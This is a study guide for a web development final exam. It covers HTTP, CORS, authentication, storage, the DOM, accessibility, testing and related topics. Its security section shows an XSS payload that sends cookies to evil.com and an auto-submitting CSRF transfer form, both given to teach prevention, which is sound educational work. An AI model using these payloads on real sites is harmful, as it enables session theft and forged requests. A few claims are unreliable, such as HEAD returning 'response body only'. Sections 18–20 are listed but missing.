# Study Guide 08 — Web APIs & Other Topics

**Goal: 100% on the final exam.** This guide covers every topic in glossary section H and all miscellaneous topics not in the other 7 study guides (CSS, JS/TS, React, State, Next.js, Forms, Socket.io).

---

## Table of Contents

1. [HTTP Methods & Status Codes](#1-http-methods--status-codes)
2. [REST Principles](#2-rest-principles)
3. [Fetch API (Deep Dive)](#3-fetch-api-deep-dive)
4. [CORS](#4-cors)
5. [Authentication](#5-authentication-jwt-sessions-cookies-oauth)
6. [Web Storage: localStorage vs sessionStorage vs Cookies](#6-web-storage-localstorage-vs-sessionstorage-vs-cookies)
7. [FormData API](#7-formdata-api)
8. [Web Components](#8-web-components)
9. [HTML5 APIs](#9-html5-apis-web-workers-drag-and-drop)
10. [DOM Manipulation (from practice exams)](#10-dom-manipulation-from-practice-exams)
11. [Security: XSS & CSRF](#11-security-xss--csrf)
12. [Accessibility (ARIA, Semantic HTML, Keyboard Nav)](#12-accessibility)
13. [Performance (Lazy Loading, Code Splitting, Memoization)](#13-performance)
14. [SEO Basics](#14-seo-basics)
15. [Testing (Jest & React Testing Library)](#15-testing-jest--react-testing-library)
16. [Service Workers / PWA Basics](#16-service-workers--pwa-basics)
17. [Topics Not Covered Elsewhere](#17-topics-not-covered-elsewhere)
18. [Key Defaults & Must-Memorize Tables](#18-key-defaults--must-memorize-tables)
19. [Likely Exam Questions](#19-likely-exam-questions)
20. [Cheat Sheet](#20-cheat-sheet)

---

## 1. HTTP Methods & Status Codes

### HTTP Methods

| Method | Purpose | Has Body? | Idempotent? | Safe? |
|--------|---------|-----------|-------------|-------|
| **GET** | Retrieve data | No | Yes | Yes |
| **POST** | Create new resource | Yes | No | No |
| **PUT** | Replace entire resource | Yes | Yes | No |
| **PATCH** | Partially update resource | Yes | No | No |
| **DELETE** | Delete resource | No (usually) | Yes | No |
| **HEAD** | Like GET but response body only (used by Next.js Route Handlers) | No | Yes | Yes |
| **OPTIONS** | Describe communication options (CORS preflight) | No | Yes | Yes |

**Next.js Route Handlers support:** `GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `HEAD`, `OPTIONS`

**Server Functions use:** HTTP POST only (the ONLY way to invoke them)

### HTTP Status Codes — Must Know

| Code | Name | Meaning |
|------|------|---------|
| **200** | OK | Success. Used for GET responses |
| **201** | Created | Resource successfully created. Used for POST |
| **204** | No Content | Success, but no body returned. Used for DELETE |
| **301** | Moved Permanently | Redirect — URL changed forever. Browser caches this |
| **302** | Found / Temporary Redirect | Redirect — URL temporarily changed |
| **400** | Bad Request | Client sent invalid data |
| **401** | Unauthorized | Not authenticated (not logged in) |
| **403** | Forbidden | Authenticated but not authorized (no permission) |
| **404** | Not Found | Resource does not exist |
| **409** | Conflict | Request conflicts with server state (e.g., duplicate email) |
| **500** | Internal Server Error | Server crashed or unexpected error |

**Memory trick for 4xx vs 5xx:** 4xx = client's fault, 5xx = server's fault

**Critical distinction — 401 vs 403:**
- 401: "I don't know who you are" — no auth token / not logged in
- 403: "I know who you are, but you can't do this" — insufficient permissions

---

## 2. REST Principles

**REST** = Representational State Transfer

### The 6 REST Constraints

| Constraint | Meaning |
|------------|---------|
| **Client-Server** | Separation of concerns. Client handles UI, server handles data |
| **Stateless** | Each request contains ALL information needed. No session on server |
| **Cacheable** | Responses must define if they're cacheable |
| **Uniform Interface** | Consistent resource naming (nouns, not verbs) |
| **Layered System** | Client doesn't know if talking to origin server or proxy |
| **Code on Demand** (optional) | Server can send executable code to client |

### RESTful URL Conventions

```
GET    /users          → list all users
POST   /users          → create a new user
GET    /users/42       → get user with id 42
PUT    /users/42       → replace user 42
PATCH  /users/42       → partially update user 42
DELETE /users/42       → delete user 42
```

**Key rules:**
- Use **nouns** not verbs (`/users` not `/getUsers`)
- Use **plural** for collections
- Use **HTTP methods** to convey action
- Nested resources: `/users/42/posts`

---

## 3. Fetch API (Deep Dive)

### Core Behavior

```typescript
// fetch() always returns a Promise that resolves to a Response object
const response = await fetch('/api/users');
```

### Critical Facts — These Appear on Exams

| Fact | Detail |
|------|--------|
| **fetch() returns** | A Promise that resolves to a `Response` object |
| **response.ok** | `true` if status is 200-299, `false` otherwise |
| **response.json()** | Returns a **Promise** — you MUST await it |
| **response.text()** | Returns a **Promise** — for plain text bodies |
| **404 does NOT reject** | fetch resolves on 404! You must check `response.ok` |
| **Network error DOES reject** | DNS failure, no internet, CORS block → fetch rejects |

### Common Bug Pattern (exam favorite!)

```typescript
// BUG — missing await before response.json()
async function loadUser(id: string) {
  const response = await fetch(`/api/users/${id}`);
  const data = response.json();  // ← returns Promise, NOT the data!
  return data.name.toUpperCase(); // TypeError: Cannot read 'name' of Promise
}

// CORRECT
async function loadUser(id: string): Promise<string> {
  try {
    const response = await fetch(`/api/users/${id}`);
    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
    const data: User = await response.json(); // ← awaited
    return data.name.toUpperCase();
  } catch (error) {
    console.error('Failed to load user:', error);
    throw error;
  }
}
```

### Two Bugs to Always Identify

1. **Missing `await` before `response.json()`** — returns a Promise instead of data
2. **No error handling** — 404/500 responses are not caught; network errors crash silently

### fetch with Options

```typescript
// POST request
const response = await fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Alice', email: 'alice@example.com' }),
});

// With credentials (cookies sent cross-origin)
const response = await fetch('/api/data', {
  credentials: 'include',
});
```

### fetch in the Event Loop

- `fetch()` is handled by **Web APIs** (browser-provided), not the main JS thread
- When resolved, the callback goes to the **Microtask Queue** (via `.then()` / `await`)
- Microtasks run BEFORE macrotasks (setTimeout)

---

## 4. CORS

### What is CORS?

**Cross-Origin Resource Sharing** — a security mechanism that restricts web pages from making requests to a different origin (protocol + domain + port).

**Same origin:** `https://example.com:443` ← all three must match

### When is CORS triggered?

When a request goes to a **different origin** from the page's origin:
- `https://app.com` → `https://api.com` (different domain)
- `http://` → `https://` (different protocol)
- `https://app.com:3000` → `https://app.com:4000` (different port)

### Simple vs Preflight Requests

**Simple requests** (no preflight): GET, HEAD, POST with `Content-Type: application/x-www-form-urlencoded | multipart/form-data | text/plain`

**Preflight request** (OPTIONS request sent first): triggered when:
- Method is PUT, DELETE, PATCH
- Custom headers (like `Authorization`, `Content-Type: application/json`)
- Request has credentials

### Preflight Flow

```
Browser → OPTIONS /api/data (preflight)
         Headers: Origin, Access-Control-Request-Method, Access-Control-Request-Headers

Server → 200 OK
         Headers: Access-Control-Allow-Origin, Access-Control-Allow-Methods,
                  Access-Control-Allow-Headers, Access-Control-Max-Age

Browser → actual request (GET/POST/etc.)
```

### CORS Response Headers

| Header | Meaning |
|--------|---------|
| `Access-Control-Allow-Origin: *` | Allow any origin (no credentials) |
| `Access-Control-Allow-Origin: https://app.com` | Allow specific origin |
| `Access-Control-Allow-Methods: GET, POST, PUT` | Allowed HTTP methods |
| `Access-Control-Allow-Headers: Content-Type, Authorization` | Allowed headers |
| `Access-Control-Allow-Credentials: true` | Allow cookies/credentials |
| `Access-Control-Max-Age: 86400` | Cache preflight for 24h |

### Credentials + CORS

- Cannot use `Access-Control-Allow-Origin: *` with credentials
- Must specify exact origin AND `Access-Control-Allow-Credentials: true`
- Client must send `credentials: 'include'` in fetch options

### CORS Error — fetch rejects

A CORS error causes `fetch()` to **reject** (same as a network error). This is a browser security policy — the server response is blocked.

---

## 5. Authentication: JWT, Sessions, Cookies, OAuth

### Session-Based Authentication

```
1. User POSTs credentials
2. Server validates, creates session in database
3. Server sets cookie: Set-Cookie: sessionId=abc123; HttpOnly; Secure
4. Browser sends cookie automatically on subsequent requests
5. Server looks up session by ID on each request
```

**Pros:** Easy to invalidate (just delete session from DB)
**Cons:** Server must store session state — not truly stateless

### JWT Authentication

**JWT** = JSON Web Token — a self-contained token with 3 parts: `header.payload.signature`

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0MiJ9.abc123signature
```

- **Header:** Algorithm used (e.g., HS256)
- **Payload:** Claims (userId, role, expiry) — **NOT encrypted, only Base64 encoded!**
- **Signature:** HMAC of header+payload using secret key

```
1. User POSTs credentials
2. Server validates, creates JWT with payload: { userId: 42, role: "admin" }
3. Server returns JWT (stored in localStorage or httpOnly cookie)
4. Client sends JWT in Authorization header: Bearer <token>
5. Server validates signature — no DB lookup needed
```

**Pros:** Stateless, scalable, works cross-domain
**Cons:** Cannot invalidate before expiry, payload is readable (don't put secrets in it)

### Token Storage — Where to store JWT?

| Location | XSS risk | CSRF risk | Notes |
|----------|----------|-----------|-------|
| **localStorage** | Yes (JS can read it) | No (not auto-sent) | Convenient but XSS-vulnerable |
| **sessionStorage** | Yes | No | Same as localStorage, cleared on tab close |
| **httpOnly Cookie** | No (JS cannot read) | Yes (auto-sent) | Most secure; pair with CSRF token |
| **Memory (JS variable)** | Low | No | Lost on page refresh |

### Cookie Attributes

```http
Set-Cookie: token=abc; 
  HttpOnly;         ← JS cannot access (prevents XSS token theft)
  Secure;           ← Only sent over HTTPS
  SameSite=Strict;  ← Never sent cross-site (prevents CSRF)
  Path=/;
  Max-Age=3600
```

**SameSite values:**
- `Strict` — cookie never sent cross-site
- `Lax` — cookie sent on top-level GET navigations only (default in modern browsers)
- `None` — always sent (requires Secure flag)

### OAuth 2.0 Basics

OAuth 2.0 is an **authorization framework** (not authentication) that lets users grant third-party apps access to their data without sharing passwords.

**Flow (Authorization Code):**
```
1. User clicks "Login with Google"
2. App redirects to Google's authorization server
3. User grants permission
4. Google redirects back with authorization code
5. App exchanges code for access token (server-to-server)
6. App uses access token to call Google APIs
```

**Key terms:**
- **Resource Owner:** The user
- **Client:** Your app
- **Authorization Server:** Google/GitHub/etc.
- **Resource Server:** The API (e.g., Google Drive API)
- **Access Token:** Short-lived token to access resources
- **Refresh Token:** Long-lived token to get new access tokens

---

## 6. Web Storage: localStorage vs sessionStorage vs Cookies

### Comparison Table

| Feature | localStorage | sessionStorage | Cookie |
|---------|-------------|----------------|--------|
| **Persistence** | Until manually cleared | Until tab closes | Set by server (`Max-Age`/`Expires`) |
| **Capacity** | ~5MB | ~5MB | ~4KB |
| **Accessible from JS** | Yes | Yes | Yes (unless `HttpOnly`) |
| **Sent with requests** | No | No | Yes (automatically) |
| **Same-origin** | Yes | Yes | Domain-configurable |
| **Server can set** | No | No | Yes (`Set-Cookie` header) |

### Web Storage API (same for both localStorage and sessionStorage)

```javascript
// Store data (must stringify objects)
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));

// Retrieve data (must parse JSON)
const user = JSON.parse(localStorage.getItem('user'));

// Remove item
localStorage.removeItem('user');

// Clear all
localStorage.clear();
```

**Critical fact:** Web Storage can only store **strings**. Objects must be serialized with `JSON.stringify()` and deserialized with `JSON.parse()`.

### Zustand persist middleware uses localStorage by default

```typescript
// Zustand with sessionStorage
create()(persist(
  (set) => ({ ... }),
  { 
    name: "cart-storage",
    storage: createJSONStorage(() => sessionStorage) // override default
  }
));
```

---

## 7. FormData API

`FormData` is used to send multipart/form-data (files + text fields) via fetch.

```typescript
// HTML form
<form onSubmit={handleSubmit}>
  <input name="name" type="text" />
  <input name="avatar" type="file" />
</form>

// Server Action receives FormData
async function createUser(formData: FormData) {
  const name = formData.get('name') as string;
  const avatar = formData.get('avatar') as File;
  
  // Validate
  if (!name) return { error: 'Name required' };
  
  // Save to DB
  await db.user.create({ data: { name } });
}
```

**Key methods:**
- `formData.get('fieldName')` — get single value
- `formData.getAll('fieldName')` — get multiple values (checkboxes)
- `formData.append('key', value)` — add a field
- `formData.set('key', value)` — set/overwrite a field

**How Next.js Server Actions receive FormData:** When a `<form action={serverAction}>` is submitted, Next.js automatically passes the form data as `FormData` to the server action.

---

## 8. Web Components

Web Components are a set of browser APIs for creating reusable custom HTML elements.

### The Three Technologies

| Technology | Purpose |
|------------|---------|
| **Custom Elements** | Define new HTML tags with custom behavior |
| **Shadow DOM** | Encapsulated DOM tree — styles don't leak in/out |
| **HTML Templates** | `<template>` element — content not rendered until cloned |

### Custom Elements API

```javascript
// 1. Define a class extending HTMLElement
class MyCard extends HTMLElement {
  // Called when element is added to the DOM
  connectedCallback() {
    this.innerHTML = `<div class="card">${this.getAttribute('title')}</div>`;
  }
  
  // Called when element is removed from DOM
  disconnectedCallback() {
    // cleanup
  }
  
  // Called when observed attribute changes
  attributeChangedCallback(name, oldValue, newValue) {
    this.render();
  }
  
  // Must declare which attributes to observe
  static get observedAttributes() {
    return ['title', 'description'];
  }
}

// 2. Register the custom element (must contain a hyphen!)
customElements.define('my-card', MyCard);
```

```html
<!-- 3. Use it like any HTML element -->
<my-card title="Hello" description="World"></my-card>
```

### Shadow DOM

```javascript
class MyComponent extends HTMLElement {
  connectedCallback() {
    // Create shadow root (isolated DOM tree)
    const shadow = this.attachShadow({ mode: 'open' });
    
    // Styles here don't affect the rest of the page
    shadow.innerHTML = `
      <style>
        p { color: red; } /* only affects THIS component */
      </style>
      <p>Hello from shadow DOM</p>
    `;
  }
}
```

**Key facts:**
- `mode: 'open'` — JS outside can access shadow DOM via `element.shadowRoot`
- `mode: 'closed'` — shadow DOM is completely private
- Custom element tag names **must contain a hyphen** (e.g., `my-card`, NOT `mycard`)

### Lifecycle Callbacks

| Callback | When called |
|----------|-------------|
| `connectedCallback()` | Element added to DOM |
| `disconnectedCallback()` | Element removed from DOM |
| `attributeChangedCallback(name, old, new)` | Observed attribute changed |
| `adoptedCallback()` | Element moved to a new document |

---

## 9. HTML5 APIs: Web Workers, Drag and Drop

### Web Workers

Web Workers run JavaScript in a **background thread** — separate from the main thread.

**Key facts:**
- Workers have NO access to the DOM
- Workers communicate with the main thread via `postMessage()`
- Workers CAN make `fetch()` network requests
- Workers share NO memory with the main thread by default (use `SharedArrayBuffer` explicitly)
- Best for: CPU-intensive calculations that would block the UI

```javascript
// main.js
const worker = new Worker('worker.js');
worker.postMessage({ data: largeArray });
worker.onmessage = (event) => {
  console.log('Result:', event.data);
};

// worker.js
self.onmessage = (event) => {
  const result = heavyComputation(event.data.data);
  self.postMessage(result);
};
```

### Drag and Drop API

**Minimum setup to make drag and drop work:**

```html
<!-- Make element draggable -->
<div draggable="true" id="item">Drag me</div>

<!-- Drop target -->
<div id="target">Drop here</div>
```

```javascript
// 1. On dragstart: set the data being dragged
document.getElementById('item').addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', e.target.id);
});

// 2. On dragover: MUST call preventDefault() or drop won't work!
document.getElementById('target').addEventListener('dragover', (e) => {
  e.preventDefault(); // THIS IS REQUIRED
});

// 3. On drop: retrieve the data and handle it
document.getElementById('target').addEventListener('drop', (e) => {
  e.preventDefault();
  const id = e.dataTransfer.getData('text/plain');
  e.target.appendChild(document.getElementById(id));
});
```

**Critical:** `preventDefault()` on `dragover` is **REQUIRED** — the default behavior prevents dropping.

---

## 10. DOM Manipulation (from practice exams)

This appeared in practice exams 7 and 15. Key concepts:

### DOM Traversal Properties

| Node-based (includes text nodes) | Element-only (elements only) |
|----------------------------------|------------------------------|
| `childNodes` | `children` |
| `parentNode` | `parentElement` |
| `nextSibling` | `nextElementSibling` |
| `previousSibling` | `previousElementSibling` |
| `firstChild` | `firstElementChild` |
| `lastChild` | `lastElementChild` |

**Critical:** `nextSibling` and `previousSibling` return **text nodes** (whitespace between HTML tags), NOT just elements. Use `nextElementSibling` to get the next element.

### DOM Selectors

```javascript
// All valid selectors
document.getElementById('myId')
document.getElementsByClassName('myClass') // HTMLCollection, live
document.getElementsByTagName('div')       // HTMLCollection, live
document.querySelector('.myClass')         // first match
document.querySelectorAll('.myClass')      // all matches, NodeList

// querySelectorAll is "the most powerful selector" — accepts ANY valid CSS selector
document.querySelectorAll(':nth-child(1)')
document.querySelectorAll('a[href^="http"]')
```

**INVALID selectors (trap questions):**
- `document.getElementByClass()` — does NOT exist
- `document.querySelect()` — does NOT exist (it's `querySelector`)

### DOM Manipulation

```javascript
// Create and append
const p = document.createElement('p');
p.textContent = 'Hello';
document.body.appendChild(p);  // adds as LAST child

// Insert before a specific sibling
parent.insertBefore(newNode, referenceNode);

// Remove
parent.removeChild(child);  // invoked on the PARENT

// Replace
parent.replaceChild(newNode, oldNode);  // invoked on the PARENT
```

### innerHTML vs textContent

| | innerHTML | textContent / innerText |
|---|-----------|------------------------|
| `<p>hello</p>` | Renders as actual `<p>` element | Rendered as literal string `<p>hello</p>` |
| Use for | Dynamic HTML | Plain text (safer) |
| XSS risk | YES — never use with user input | No |

### dataset (HTML5 data attributes)

```html
<div data-user-id="42" data-role="admin"></div>
```

```javascript
const elem = document.querySelector('div');
console.log(elem.dataset.userId);  // "42"  (camelCase conversion)
elem.dataset.role = "guest";       // set new value
```

### nodeType Values

| nodeType | Node type |
|----------|-----------|
| 1 | Element node |
| 2 | Attribute node |
| 3 | Text node |
| 8 | Comment node |

### Event Handling

```javascript
// addEventListener (PREFERRED — allows multiple handlers)
element.addEventListener('click', function(event) {
  event.stopPropagation();  // stop bubbling
}, false);

// Three ways to stop bubbling:
event.stopPropagation();
event.cancelBubble = true;
event.stopImmediatePropagation();
```

**DOMContentLoaded** — fires when document is fully loaded and parsed (before images load):

```javascript
document.addEventListener('DOMContentLoaded', function() {
  // Safe to manipulate DOM here
});
```

---

## 11. Security: XSS & CSRF

### XSS (Cross-Site Scripting)

**What it is:** An attacker injects malicious JavaScript into a web page that is then executed in other users' browsers.

**Types:**
- **Stored XSS:** Malicious script saved in database, served to all visitors
- **Reflected XSS:** Script is in URL parameter, reflected back in response
- **DOM-based XSS:** Script executed through client-side JavaScript

**Example attack:**
```javascript
// User submits this as a comment:
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// If site renders it as innerHTML without sanitization → all users get hacked
```

**Prevention:**
- **Never use `innerHTML` with user input** — use `textContent` instead
- Sanitize/escape user input before rendering
- Content Security Policy (CSP) headers
- `HttpOnly` cookies prevent JS from reading them (limits damage)

### CSRF (Cross-Site Request Forgery)

**What it is:** An attacker tricks an authenticated user's browser into making an unwanted request to the server. Since the browser automatically sends cookies, the server processes the malicious request as legitimate.

**Example attack:**
```html
<!-- Attacker's page embeds this hidden form -->
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000">
  <input name="to" value="attacker-account">
</form>
<script>document.forms[0].submit();</script>
<!-- If user is logged in to bank.com, their session cookie is sent automatically -->
```

**Prevention:**
- **CSRF tokens:** Server generates unique token per session, client must include it in every state-changing request
- **SameSite=Strict cookies:** Browser never sends cookies on cross-site requests
- **Double Submit Cookie:** Token in both cookie and request body
- Check `Origin`/`Referer` headers

**CSRF vs XSS:**
- XSS: Code runs **in the victim's browser** on the legitimate site
- CSRF: Attacker tricks browser into making a **request to the legitimate site**

---

## 12. Accessibility

### Why Accessibility Matters

Accessibility (a11y) ensures web content is usable by people with disabilities (visual, auditory, motor, cognitive). It is also often a legal requirement.

### Semantic HTML

**Use the right element for the right job** — semantic elements communicate meaning to assistive technologies (screen readers).

| Use | Don't use |
|-----|-----------|
| `<button>` for buttons | `<div onclick>` for buttons |
| `<nav>` for navigation | `<div class="nav">` |
| `<main>` for main content | `<div id="main">` |
| `<article>` for standalone content | Generic `<div>` |
| `<h1>`-`<h6>` for headings | `<div class="heading">` |
| `<label>` + `<input>` for forms | `<div>Name: <input>` |
| `<table>` for tabular data | `<div>` grid for tables |

### ARIA (Accessible Rich Internet Applications)

ARIA attributes add semantic meaning when HTML alone is insufficient.

```html
<!-- role: defines what the element IS -->
<div role="button" tabindex="0">Click me</div>

<!-- aria-label: provides accessible name when text isn't visible -->
<button aria-label="Close dialog">×</button>

<!-- aria-labelledby: point to element that provides the label -->
<h2 id="dialog-title">Settings</h2>
<dialog aria-labelledby="dialog-title">...</dialog>

<!-- aria-describedby: provides additional description -->
<input aria-describedby="email-hint" />
<p id="email-hint">Enter your work email address</p>

<!-- aria-expanded: state for collapsible elements -->
<button aria-expanded="false" aria-controls="menu">Menu</button>
<ul id="menu" hidden>...</ul>

<!-- aria-hidden: hide from assistive technology -->
<span aria-hidden="true">★★★★☆</span>
<span class="sr-only">4 out of 5 stars</span>

<!-- aria-live: announce dynamic content updates -->
<div aria-live="polite">Loading complete...</div>
<div aria-live="assertive">Error! Please try again.</div>
```

**Rule:** Use semantic HTML first. Only use ARIA when semantic HTML is not sufficient. "No ARIA is better than bad ARIA."

### Keyboard Navigation

All interactive elements must be usable with keyboard alone:
- **Tab** — move to next focusable element
- **Shift+Tab** — move to previous focusable element
- **Enter/Space** — activate button or link
- **Arrow keys** — navigate within components (dropdowns, menus)

```html
<!-- Make custom elements focusable -->
<div role="button" tabindex="0" 
     onClick={handleClick}
     onKeyDown={(e) => e.key === 'Enter' && handleClick()}>
  Custom Button
</div>

<!-- Skip navigation link (jumps past nav to main content) -->
<a href="#main-content" class="sr-only focus:not-sr-only">
  Skip to main content
</a>

<!-- Focus management: trap focus in modal -->
<dialog>
  <!-- First focusable element gets focus on open -->
  <!-- Tab loops within dialog -->
  <!-- Esc closes dialog and returns focus -->
</dialog>
```

**`tabindex` values:**
- `tabindex="0"` — element participates in natural tab order
- `tabindex="-1"` — element is focusable programmatically but not via Tab
- `tabindex="1"` (or positive) — avoid, creates unpredictable tab order

### Color Contrast

- Normal text: minimum 4.5:1 contrast ratio (WCAG AA)
- Large text (18pt+ or 14pt+ bold): minimum 3:1
- UI components: minimum 3:1

---

## 13. Performance

### Lazy Loading

**Images:**
```html
<!-- Native lazy loading — image loads only when entering viewport -->
<img src="large-photo.jpg" loading="lazy" alt="Description">
```

**Code splitting with dynamic imports:**
```javascript
// React lazy loading
const HeavyChart = React.lazy(() => import('./HeavyChart'));

function Dashboard() {
  return (
    <Suspense fallback={<div>Loading chart...</div>}>
      <HeavyChart />
    </Suspense>
  );
}

// Next.js dynamic imports
import dynamic from 'next/dynamic';
const Chart = dynamic(() => import('./Chart'), { loading: () => <p>Loading...</p> });
```

### Code Splitting

**Why:** Don't load all JavaScript upfront. Split into chunks that load when needed.

**Next.js does this automatically** — each page/route is its own chunk. Server Components also reduce client-side JS bundle.

### Memoization in React

| Tool | What it memoizes | When to use |
|------|-----------------|-------------|
| `useMemo` | A **computed value** | Expensive calculations that depend on specific deps |
| `useCallback` | A **function reference** | Pass stable function references to memoized children |
| `React.memo` | A **component** | Prevents re-render if props haven't changed |

```typescript
// useMemo — cache the result of expensive filtering
const filteredProducts = useMemo(() => 
  products.filter(p => p.category === category),
  [products, category]
);

// useCallback — stable function reference for memoized child
const handleAdd = useCallback((item: CartItem) => {
  setCart(prev => [...prev, item]);
}, []); // empty deps = stable reference forever

// React.memo — component won't re-render if props unchanged
const CartItem = React.memo(({ item, onRemove }) => (
  <div>{item.name} <button onClick={() => onRemove(item.id)}>Remove</button></div>
));
```

**Functional updater pattern** ("betri leid" — the better way):
```typescript
// Without functional updater: todos must be in deps array
const handleAdd = useCallback((text: string) => {
  setTodos([...todos, { id: nextId++, text }]);
}, [todos]); // recreated every time todos changes!

// WITH functional updater: empty deps array, stable reference
const handleAdd = useCallback((text: string) => {
  setTodos(prev => [...prev, { id: nextId++, text }]);
}, []); // NEVER recreated
```

### Core Web Vitals

| Metric | What it measures | Target |
|--------|-----------------|--------|
| **LCP** (Largest Contentful Paint) | How fast the main content loads | < 2.5s |
| **FID** / **INP** (Interaction to Next Paint) | How responsive to user input | < 200ms |
| **CLS** (Cumulative Layout Shift) | Visual stability (no jumping content) | < 0.1 |

**Next.js Image component** addresses:
- LCP (optimized, correct-size images)
- CLS (reserves space to prevent layout shift)

---

## 14. SEO Basics

### Why Server Components Help SEO

Search engines can only read HTML. JavaScript-rendered content (CSR) may not be indexed. Server-rendered HTML (Next.js Server Components) is immediately readable by crawlers.

### Metadata in Next.js

```typescript
// Static metadata
export const metadata: Metadata = {
  title: 'My Page Title',
  description: 'Page description for search engines',
  openGraph: {
    title: 'My Page',
    description: 'Social share description',
    images: ['/og-image.jpg'],
  },
};

// Dynamic metadata
export async function generateMetadata({ params }: Props) {
  const product = await getProduct(params.id);
  return {
    title: product.name,
    description: product.description,
  };
}
```

### SEO Best Practices

- **Semantic HTML** — `<h1>`, `<article>`, `<nav>` help crawlers understand structure
- **`<h1>` once per page** — the main heading
- **Alt text on images** — describes images for crawlers and screen readers
- **Descriptive URLs** — `/products/blue-widget` beats `/products?id=42`
- **Canonical URLs** — `<link rel="canonical">` prevents duplicate content
- **Server-side rendering** — crawlers get content immediately
- **Page speed** — Core Web Vitals are a ranking factor

---

## 15. Testing (Jest & React Testing Library)

### Jest Basics

**Jest** is a JavaScript testing framework used for unit and integration tests.

```typescript
// Basic test structure
describe('UserCard component', () => {
  it('renders the user name', () => {
    // Arrange, Act, Assert (AAA pattern)
    expect(1 + 1).toBe(2);
    expect({ name: 'Alice' }).toEqual({ name: 'Alice' });
    expect(null).toBeNull();
    expect([1, 2, 3]).toContain(2);
    expect(fn).toHaveBeenCalledWith('arg');
  });
});

// Mock a module
jest.mock('./api', () => ({
  fetchUser: jest.fn().mockResolvedValue({ name: 'Alice' }),
}));
```

**Common matchers:**
- `toBe(val)` — strict equality (===)
- `toEqual(val)` — deep equality (for objects/arrays)
- `toBeTruthy()` / `toBeFalsy()`
- `toContain(item)` — array/string contains
- `toThrow()` — function throws an error
- `toHaveBeenCalled()` / `toHaveBeenCalledWith(...args)`

### React Testing Library

**Philosophy:** Test behavior from the user's perspective, not implementation details.

```typescript
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

describe('Counter', () => {
  it('increments when button is clicked', async () => {
    const user = userEvent.setup();
    render(<Counter />);
    
    // Query by role (preferred) or text
    const button = screen.getByRole('button', { name: /increment/i });
    const count = screen.getByText('Count: 0');
    
    await user.click(button);
    
    expect(screen.getByText('Count: 1')).toBeInTheDocument();
  });
});
```

**Query priority (use in this order):**
1. `getByRole` — best, most accessible
2. `getByLabelText` — for form inputs
3. `getByPlaceholderText`
4. `getByText`
5. `getByTestId` — last resort

**Query variants:**
- `getBy...` — throws if not found
- `queryBy...` — returns null if not found (use for "should NOT exist" tests)
- `findBy...` — async, waits for element to appear

---

## 16. Service Workers / PWA Basics

### Service Workers

A Service Worker is a JavaScript file that runs in the background, separate from the web page. It acts as a **programmable network proxy**.

**Key capabilities:**
- Intercept and cache network requests (offline support)
- Background sync
- Push notifications

```javascript
// Register a service worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

// In sw.js — intercept fetches and respond from cache
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      return cached || fetch(event.request);
    })
  );
});
```

**Service Worker lifecycle:**
1. Register
2. Install (cache assets)
3. Activate (clear old caches)
4. Fetch (intercept requests)

### PWA (Progressive Web App)

A PWA is a web app that behaves like a native app:
- **Installable** (appears on home screen)
- **Offline capable** (via Service Worker + Cache API)
- **Push notifications**
- **Responsive design**

**Required for PWA:**
- HTTPS
- Web App Manifest (`manifest.json`)
- Service Worker

```json
// manifest.json
{
  "name": "My PWA",
  "short_name": "PWA",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "icons": [...]
}
```

---

## 17. Topics Not Covered Elsewhere

After scanning all 15 practice exams, the following topics appear but are NOT covered in the other 7 study guide areas (CSS, JS/TS, React, State, Next.js, Forms, Socket.io):

### JavaScript Design Patterns (Practice Exam 11)

These patterns appeared in exam 11 and may appear on the final:

| Pattern | Key Idea | Real-world analogy |
|---------|----------|--------------------|
| **Factory** | Interface for creating objects; subclasses decide which class to instantiate | A car factory that produces Cars or Trucks based on input |
| **Singleton** | Only ONE instance ever created; shared across app | A plain JS object literal is already a singleton |
| **Decorator** | Add behavior to an existing object dynamically | Adding milk/sugar to coffee (base coffee unchanged) |
| **Facade** | Simple API hiding complex underlying code | jQuery's `$.hide()` hides DOM manipulation complexity |
| **Flyweight** | Separate data into shared (intrinsic) and unique (extrinsic) parts to save memory | 30 copies of one book — store book data once, checkout data 30 times |
| **Observer/Pub-Sub** | Objects subscribe to events; publishers notify all subscribers | Redux is heavily dependent on Observer pattern |
| **Mediator** | Central hub that all objects communicate through | Reduces N*(N-1) connections to N connections |
| **Iterator** | Traverse a collection without exposing its structure | `$.each()` in jQuery |

**Observer pattern core operations:**
1. `subscribe` — register interest in an event
2. `publish` — broadcast notification to all subscribers
3. `unsubscribe` — remove a subscription

**Observer pros/cons:**
- Pro: Loosely coupled modules
- Con: Hard to trace data flow, publishers don't know if subscribers fail

**Decorator pattern — MacBook cost example:**
```javascript
var mb = new MacBook();    // cost: 997
Memory(mb);                 // cost: 997 + 75 = 1072
Insurance(mb);              // cost: 1072 + 250 = 1322
mb.cost()                   // → 1322
```

### DOM Events Deep Dive (Practice Exam 7)

**Four parts of an event:**
1. **Event type** — string describing what happened (`'click'`, `'input'`)
2. **Event target** — element associated with the event
3. **Event object** — object passed to handler with info about the event
4. **Event handler** — function that runs when event fires

**Event object properties (from slides):**
- `event.target` — element that triggered the event
- `event.type` — type of event (e.g., `'mousedown'`)
- `event.bubbles` — boolean, whether event bubbles

**Event registration methods:**
| Method | Pro | Con |
|--------|-----|-----|
| `element.onclick = fn` | Simple | Only ONE handler (overwrites previous) |
| `element.addEventListener('click', fn)` | Multiple handlers | None |
| `element.attachEvent('onclick', fn)` | IE-specific | Non-standard |
| `<button onclick="fn()">` | Simple | "Dirty HTML", cluttered |

**Event bubbling:** Events propagate from target up through ancestors to document. Use for event delegation (one listener on parent handles all children).

### CSS Animations (Practice Exam 13)

Animation shorthand order (8 values):
```
animation: [name] [duration] [timing-function] [delay] [iteration-count] [direction] [fill-mode] [play-state]

animation: myAnimation 5s ease-in 2s 10 reverse backwards running;
```

**animation-direction values:** `normal`, `reverse`, `alternate`
**animation-fill-mode values:** `forwards`, `backwards`, `both`
**animation-play-state values:** `paused`, `running`

